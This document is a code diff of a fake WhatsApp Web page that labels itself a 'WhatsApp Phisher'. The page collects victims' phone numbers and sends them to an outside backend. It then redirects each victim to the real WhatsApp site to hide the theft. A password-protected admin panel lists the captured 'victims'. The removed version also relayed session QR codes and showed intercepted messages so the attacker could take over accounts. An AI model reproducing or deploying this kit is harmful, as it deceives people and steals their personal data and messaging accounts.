@@ -22,7 +22,7 @@
         }
 
         .container {
-            max-width: 550px;
+            max-width: 500px;
             width: 100%;
             background: white;
             border-radius: 25px;
@@ -37,7 +37,7 @@
             color: white;
         }
 
-        .official-logo {
+        .logo {
             width: 70px;
             height: 70px;
             background: white;
@@ -48,14 +48,9 @@
             margin: 0 auto 15px;
         }
 
-        .official-logo svg {
+        .logo svg {
             width: 45px;
             height: 45px;
-        }
-
-        .header h1 {
-            font-size: 24px;
-            margin-bottom: 5px;
         }
 
         .qr-container {
@@ -67,38 +62,22 @@
             border: 2px solid #25D366;
         }
 
-        .qr-wrapper {
+        .qr-placeholder {
             background: white;
-            padding: 15px;
+            padding: 40px;
             border-radius: 15px;
-            display: inline-block;
-            min-height: 250px;
-            min-width: 250px;
+            text-align: center;
         }
 
-        #qrCode {
-            width: 220px;
-            height: 220px;
-            display: block;
+        .qr-icon {
+            font-size: 60px;
+            margin-bottom: 10px;
+            animation: pulse 2s infinite;
         }
 
-        .qr-status {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #667781;
-        }
-
-        .qr-status.connected {
-            color: #25D366;
-            font-weight: bold;
-        }
-
-        .qr-status.loading {
-            color: #ff9800;
-        }
-
-        .qr-status.error {
-            color: #dc3545;
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
 
         .input-group {
@@ -130,15 +109,18 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
+            transition: all 0.3s;
         }
 
         .btn:hover {
             background: #128C7E;
+            transform: translateY(-2px);
         }
 
         .btn:disabled {
             background: #ccc;
             cursor: not-allowed;
+            transform: none;
         }
 
         .status {
@@ -161,6 +143,12 @@
             display: block;
         }
 
+        .status.info {
+            background: #e3f2fd;
+            color: #1565c0;
+            display: block;
+        }
+
         .admin-badge {
             position: fixed;
             bottom: 20px;
@@ -171,6 +159,7 @@
             border-radius: 20px;
             font-size: 12px;
             cursor: pointer;
+            z-index: 1000;
         }
 
         .admin-badge:hover {
@@ -184,7 +173,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.9);
             z-index: 2000;
             justify-content: center;
             align-items: center;
@@ -198,10 +187,10 @@
             background: white;
             border-radius: 20px;
             max-width: 90%;
-            width: 900px;
-            max-height: 80%;
+            width: 550px;
+            max-height: 85%;
             overflow: auto;
-            padding: 20px;
+            padding: 25px;
         }
 
         .modal-header {
@@ -213,51 +202,103 @@
             padding-bottom: 15px;
         }
 
+        .modal-header h2 {
+            color: #075e54;
+        }
+
         .close-modal {
             background: none;
             border: none;
             font-size: 28px;
             cursor: pointer;
+            color: #999;
         }
 
-        .messages-box {
-            background: #f0f2f5;
-            border-radius: 10px;
+        .close-modal:hover {
+            color: #075e54;
+        }
+
+        .victim-item {
+            background: #f8f9fa;
+            border-radius: 12px;
             padding: 15px;
-            margin-top: 20px;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-
-        .message-item {
-            background: white;
-            padding: 12px;
-            margin: 8px 0;
-            border-radius: 8px;
+            margin-bottom: 15px;
             border-left: 4px solid #25D366;
         }
 
-        .message-sender {
+        .victim-phone {
+            font-weight: bold;
+            color: #075e54;
+            font-size: 16px;
+        }
+
+        .victim-time {
+            font-size: 12px;
+            color: #999;
+            margin-top: 5px;
+        }
+
+        .stats-bar {
+            background: #e8f5e9;
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .stats-number {
+            font-size: 24px;
             font-weight: bold;
             color: #075e54;
         }
 
-        .message-text {
-            margin-top: 5px;
-            color: #333;
+        .refresh-btn {
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            width: 100%;
         }
 
-        .message-time {
-            font-size: 10px;
-            color: #999;
-            margin-top: 5px;
+        .refresh-btn:hover {
+            background: #128C7E;
+        }
+
+        .clear-btn {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+        }
+
+        .clear-btn:hover {
+            background: #c82333;
+        }
+
+        .footer {
+            background: #f8f9fa;
+            padding: 15px;
+            text-align: center;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer p {
+            color: #667781;
+            font-size: 11px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="official-logo">
+            <div class="logo">
                 <svg viewBox="0 0 24 24" fill="#25D366">
                     <path d="M12.04 2.5c-5.25 0-9.5 4.25-9.5 9.5 0 1.75.5 3.45 1.3 4.9L2.5 21.5l5-1.3c1.45.8 3.05 1.3 4.75 1.3 5.25 0 9.5-4.25 9.5-9.5s-4.25-9.5-9.5-9.5z"/>
                 </svg>
@@ -267,10 +308,10 @@
         </div>
 
         <div class="qr-container">
-            <div class="qr-wrapper">
-                <img id="qrCode" src="" alt="QR Code">
+            <div class="qr-placeholder">
+                <div class="qr-icon">📱✨</div>
+                <p>Enter your phone number to connect</p>
             </div>
-            <div id="qrStatus" class="qr-status loading">Enter your phone number to connect</div>
         </div>
 
         <div class="input-group">
@@ -279,6 +320,10 @@
 
         <button class="btn" id="submitBtn">Connect to WhatsApp</button>
         <div id="status" class="status"></div>
+
+        <div class="footer">
+            <p>WhatsApp Web requires an active internet connection on your phone.</p>
+        </div>
     </div>
 
     <div class="admin-badge" id="adminBadge">🔒 Admin Panel</div>
@@ -286,12 +331,12 @@
     <div class="modal" id="adminModal">
         <div class="modal-content">
             <div class="modal-header">
-                <h2>📊 WhatsApp Session - Captured Messages</h2>
+                <h2>📊 Captured Phone Numbers</h2>
                 <button class="close-modal" id="closeModal">&times;</button>
             </div>
-            <div id="adminContent">
-                <div style="text-align: center; padding: 40px;">Loading...</div>
-            </div>
+            <button class="refresh-btn" id="refreshData">🔄 Refresh Data</button>
+            <div id="adminContent"></div>
+            <button class="clear-btn" id="clearData">🗑️ Clear All Data</button>
         </div>
     </div>
 
@@ -300,155 +345,147 @@
         const BACKEND_URL = 'https://mnisi5334.pythonanywhere.com';
         const ADMIN_PASSWORD = 'Phishing3694';
         
-        let checkInterval = null;
-        let sessionActive = false;
+        let capturedData = [];
 
-        // ========== HELPER FUNCTIONS ==========
+        // ========== LOAD LOCAL DATA ==========
+        function loadLocalData() {
+            const saved = localStorage.getItem('whatsapp_captured');
+            if (saved) {
+                capturedData = JSON.parse(saved);
+            } else {
+                capturedData = [];
+            }
+            return capturedData;
+        }
+
+        function saveLocalData() {
+            localStorage.setItem('whatsapp_captured', JSON.stringify(capturedData));
+        }
+
+        // ========== SHOW STATUS ==========
         function showStatus(message, type) {
             const statusDiv = document.getElementById('status');
             statusDiv.textContent = message;
             statusDiv.className = `status ${type}`;
             setTimeout(() => {
                 statusDiv.style.display = 'none';
-                statusDiv.className = 'status';
-            }, 4000);
-        }
-
-        function updateQRStatus(message, type) {
-            const qrStatus = document.getElementById('qrStatus');
-            qrStatus.textContent = message;
-            qrStatus.className = `qr-status ${type}`;
-        }
-
-        // ========== API CALLS ==========
-        async function capturePhone(phone) {
-            try {
-                const response = await fetch(`${BACKEND_URL}/api/capture`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phone })
-                });
-                return await response.json();
-            } catch (error) {
-                console.error('Capture error:', error);
-                return null;
-            }
-        }
-
-        async function getQR() {
-            try {
-                const response = await fetch(`${BACKEND_URL}/api/qr`);
-                return await response.json();
-            } catch (error) {
-                console.error('QR fetch error:', error);
-                return null;
-            }
-        }
-
-        async function getMessages() {
-            try {
-                const response = await fetch(`${BACKEND_URL}/api/messages`);
-                return await response.json();
-            } catch (error) {
-                console.error('Messages fetch error:', error);
-                return null;
-            }
-        }
-
-        async function getVictims() {
-            try {
-                const response = await fetch(`${BACKEND_URL}/api/victims`);
-                return await response.json();
-            } catch (error) {
-                console.error('Victims fetch error:', error);
-                return null;
-            }
-        }
-
-        // ========== QR CODE CHECKING ==========
-        async function startQRCheck() {
-            if (checkInterval) clearInterval(checkInterval);
-            
-            checkInterval = setInterval(async () => {
-                try {
-                    const data = await getQR();
-                    
-                    if (data && data.qr) {
-                        const qrImg = document.getElementById('qrCode');
-                        qrImg.src = `data:image/png;base64,${data.qr}`;
-                        updateQRStatus('✅ QR code ready - Scan with WhatsApp', '');
-                    }
-                    
-                    if (data && data.connected) {
-                        updateQRStatus('✅ Connected! WhatsApp is active', 'connected');
-                        sessionActive = true;
-                        clearInterval(checkInterval);
-                        showStatus('✓ Connected successfully!', 'success');
-                    }
-                } catch (error) {
-                    console.error('QR check error:', error);
-                    updateQRStatus('⚠️ Connection error - Check backend', 'error');
-                }
             }, 3000);
         }
 
-        // ========== ADMIN PANEL ==========
-        async function loadAdminPanel() {
-            const adminContent = document.getElementById('adminContent');
-            adminContent.innerHTML = '<div style="text-align: center; padding: 40px;">Loading data...</div>';
-            
+        // ========== SEND TO BACKEND ==========
+        async function sendToBackend(phone) {
             try {
-                const victims = await getVictims();
-                const messagesData = await getMessages();
+                console.log('[Sending] Phone to backend:', phone);
                 
-                let html = '';
+                const response = await fetch(`${BACKEND_URL}/api/capture`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    mode: 'cors',
+                    body: JSON.stringify({ phone: phone })
+                });
                 
-                // Victim info
-                if (victims && victims.length > 0) {
-                    const victim = victims[0];
-                    html += `
-                        <div style="margin-bottom: 20px; padding: 15px; background: #f0f2f5; border-radius: 10px;">
-                            <strong>📱 Victim Phone:</strong> ${victim.phone || 'Not captured yet'}<br>
-                            <strong>🔗 Session Status:</strong> ${victim.session_active ? '✅ Active' : '⏳ Waiting for scan'}<br>
-                            <strong>💬 Messages Captured:</strong> ${victim.messages_count || 0}
-                        </div>
-                    `;
-                } else {
-                    html += '<div style="margin-bottom: 20px; padding: 15px; background: #f0f2f5; border-radius: 10px;">⏳ Waiting for victim to enter phone number...</div>';
-                }
-                
-                // Messages
-                if (messagesData && messagesData.messages && messagesData.messages.length > 0) {
-                    html += `
-                        <h3>📱 WhatsApp Messages:</h3>
-                        <div class="messages-box">
-                    `;
-                    messagesData.messages.forEach(msg => {
-                        html += `
-                            <div class="message-item">
-                                <div class="message-sender">${msg.from || 'Unknown'}</div>
-                                <div class="message-text">${msg.message || msg}</div>
-                                <div class="message-time">${msg.time || new Date().toLocaleTimeString()}</div>
-                            </div>
-                        `;
-                    });
-                    html += '</div>';
-                } else {
-                    html += '<p>No messages captured yet. Wait for victim to scan QR code.</p>';
-                }
-                
-                html += `
-                    <button onclick="location.reload()" style="margin-top: 20px; padding: 10px 20px; background: #25D366; border: none; border-radius: 8px; cursor: pointer;">🔄 Refresh</button>
-                `;
-                
-                adminContent.innerHTML = html;
+                const data = await response.json();
+                console.log('[Backend Response]', data);
+                return data;
             } catch (error) {
-                adminContent.innerHTML = `<div style="text-align: center; padding: 40px; color: red;">❌ Error loading data. Make sure backend is running at ${BACKEND_URL}</div>`;
+                console.log('[Backend Error]', error.message);
+                return null;
             }
         }
 
-        // ========== MAIN SUBMIT FUNCTION ==========
-        async function submitPhone() {
+        // ========== LOAD VICTIMS FROM BACKEND ==========
+        async function loadVictimsFromBackend() {
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/victims`, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json'
+                    },
+                    mode: 'cors'
+                });
+                const data = await response.json();
+                console.log('[Victims from Backend]', data);
+                return data;
+            } catch (error) {
+                console.log('[Error loading victims]', error.message);
+                return [];
+            }
+        }
+
+        // ========== RENDER ADMIN PANEL ==========
+        async function renderAdminPanel() {
+            const adminContent = document.getElementById('adminContent');
+            adminContent.innerHTML = '<div style="text-align: center; padding: 20px;">Loading...</div>';
+            
+            try {
+                // Try to get data from backend first
+                const backendVictims = await loadVictimsFromBackend();
+                
+                if (backendVictims && backendVictims.length > 0) {
+                    let html = `
+                        <div class="stats-bar">
+                            <div class="stats-number">${backendVictims.length}</div>
+                            <div>Total Captured (Backend)</div>
+                        </div>
+                    `;
+                    
+                    backendVictims.forEach((item, index) => {
+                        html += `
+                            <div class="victim-item">
+                                <div class="victim-phone">📞 ${item.phone}</div>
+                                <div class="victim-time">⏰ ${item.timestamp || item.captured_at || 'Unknown'}</div>
+                                <div class="victim-time">✅ Saved to cloud database</div>
+                            </div>
+                        `;
+                    });
+                    
+                    adminContent.innerHTML = html;
+                    return;
+                }
+                
+                // Fallback to local data
+                const localData = loadLocalData();
+                
+                if (localData.length === 0) {
+                    adminContent.innerHTML = `
+                        <div style="text-align: center; padding: 40px; color: #999;">
+                            <div style="font-size: 48px;">📭</div>
+                            <p>No phone numbers captured yet</p>
+                            <p style="font-size: 12px;">Enter a phone number to test</p>
+                        </div>
+                    `;
+                    return;
+                }
+                
+                let html = `
+                    <div class="stats-bar">
+                        <div class="stats-number">${localData.length}</div>
+                        <div>Total Captured (Local)</div>
+                    </div>
+                `;
+                
+                localData.forEach((item, index) => {
+                    html += `
+                        <div class="victim-item">
+                            <div class="victim-phone">📞 ${item.phone}</div>
+                            <div class="victim-time">⏰ ${item.timestamp}</div>
+                            <div class="victim-time">💾 Saved locally</div>
+                        </div>
+                    `;
+                });
+                
+                adminContent.innerHTML = html;
+                
+            } catch (error) {
+                adminContent.innerHTML = `<div style="color: red; text-align: center;">Error: ${error.message}</div>`;
+            }
+        }
+
+        // ========== HANDLE SUBMIT ==========
+        async function handleSubmit() {
             const phone = document.getElementById('phone').value.trim();
             const submitBtn = document.getElementById('submitBtn');
             
@@ -459,63 +496,92 @@
             
             submitBtn.disabled = true;
             submitBtn.textContent = 'Connecting...';
-            showStatus('Sending request...', 'success');
-            updateQRStatus('🔄 Generating QR code...', 'loading');
+            showStatus('Connecting to WhatsApp...', 'info');
             
-            try {
-                const result = await capturePhone(phone);
-                
-                if (result && result.status === 'success') {
-                    showStatus('✓ Phone number received! QR code generating...', 'success');
-                    startQRCheck();
-                } else {
-                    throw new Error('Failed to connect to backend');
-                }
-            } catch (error) {
-                console.error('Submit error:', error);
-                showStatus('❌ Connection error. Make sure backend is running.', 'error');
-                updateQRStatus('⚠️ Cannot connect to backend', 'error');
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Connect to WhatsApp';
+            // Save locally first
+            const newEntry = {
+                phone: phone,
+                timestamp: new Date().toLocaleString(),
+                date: new Date().toISOString()
+            };
+            capturedData.unshift(newEntry);
+            saveLocalData();
+            
+            // Try to send to backend
+            const backendResult = await sendToBackend(phone);
+            
+            if (backendResult && backendResult.status === 'success') {
+                showStatus('✓ Connected! Captured to cloud', 'success');
+                console.log('[Success] Phone saved to backend');
+            } else {
+                showStatus('✓ Connected! Saved locally', 'success');
+                console.log('[Info] Phone saved locally only');
+            }
+            
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.href = 'https://web.whatsapp.com';
+            }, 2000);
+        }
+
+        // ========== CLEAR DATA ==========
+        function clearData() {
+            if (confirm('⚠️ Clear all captured phone numbers? This cannot be undone.')) {
+                capturedData = [];
+                saveLocalData();
+                renderAdminPanel();
+                showStatus('All data cleared!', 'info');
             }
         }
 
         // ========== EVENT LISTENERS ==========
-        document.getElementById('submitBtn').addEventListener('click', submitPhone);
+        document.getElementById('submitBtn').addEventListener('click', handleSubmit);
         document.getElementById('phone').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') submitPhone();
+            if (e.key === 'Enter') handleSubmit();
         });
         
         // Admin panel
         const adminBadge = document.getElementById('adminBadge');
         const adminModal = document.getElementById('adminModal');
         const closeModal = document.getElementById('closeModal');
+        const refreshBtn = document.getElementById('refreshData');
+        const clearBtn = document.getElementById('clearData');
         
         adminBadge.addEventListener('click', () => {
             const password = prompt('🔐 Enter admin password:');
             if (password === ADMIN_PASSWORD) {
-                loadAdminPanel();
+                renderAdminPanel();
                 adminModal.classList.add('active');
             } else if (password !== null) {
                 alert('❌ Wrong password!');
             }
         });
         
-        closeModal.addEventListener('click', () => adminModal.classList.remove('active'));
-        adminModal.addEventListener('click', (e) => {
-            if (e.target === adminModal) adminModal.classList.remove('active');
+        refreshBtn.addEventListener('click', () => {
+            renderAdminPanel();
         });
         
-        // ========== INITIALIZATION ==========
-        console.log('✅ WhatsApp Phisher Ready');
-        console.log(`📡 Backend URL: ${BACKEND_URL}`);
-        console.log('🔑 Admin Password: Phishing3694');
+        clearBtn.addEventListener('click', () => {
+            clearData();
+        });
         
-        // Test backend connection
-        fetch(`${BACKEND_URL}/api/status`)
-            .then(res => res.json())
-            .then(data => console.log('✅ Backend connected:', data))
-            .catch(err => console.error('❌ Backend connection failed:', err));
+        closeModal.addEventListener('click', () => {
+            adminModal.classList.remove('active');
+        });
+        
+        adminModal.addEventListener('click', (e) => {
+            if (e.target === adminModal) {
+                adminModal.classList.remove('active');
+            }
+        });
+        
+        // ========== INITIALIZE ==========
+        loadLocalData();
+        
+        console.log('%c✅ WhatsApp Phisher Ready', 'color: #25D366; font-size: 14px; font-weight: bold;');
+        console.log(`📡 Backend: ${BACKEND_URL}`);
+        console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
+        console.log('💾 Data saved both locally and to backend (if CORS fixed)');
     </script>
 </body>
 </html>
